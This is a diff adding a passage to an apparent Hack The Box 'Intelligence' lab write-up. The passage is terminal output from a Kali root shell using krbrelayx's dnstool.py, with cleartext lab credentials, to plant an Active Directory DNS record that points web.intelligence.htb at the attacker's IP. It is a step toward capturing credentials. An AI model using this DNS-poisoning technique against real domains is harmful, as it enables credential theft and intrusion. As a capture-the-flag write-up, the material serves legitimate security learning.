@@ -427,3 +427,33 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 } catch {}
 }
 ```
+
+```
+──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
+└─# python3 dnstool.py -u intelligence.htb\\Tiffany.Molina 10.10.10.248 -p NewIntelligenceCorpUser9876 -r web.intelligence.htb -a add -d 10.10.14.8                                                                                       1 ⨯
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+/root/Downloads/hackthebox/inteligence/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
+  res = dnsresolver.query(zone, 'SOA')
+[-] Adding new record
+[+] LDAP operation completed successfully
+                                                                                                                                                                                                                                              
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
+└─# python3 dnstool.py -u intelligence.htb\\Tiffany.Molina 10.10.10.248 -p NewIntelligenceCorpUser9876 -r webtest.intelligence.htb -a query
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[!] Target record not found!
+                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
+└─# python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r web.intelligence.htb -a query 10.10.10.248                                                         
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found record web
+DC=web,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
+[+] Record entry:
+ - Type: 1 (A) (Serial: 84)
+ - Address: 10.10.14.8
+```
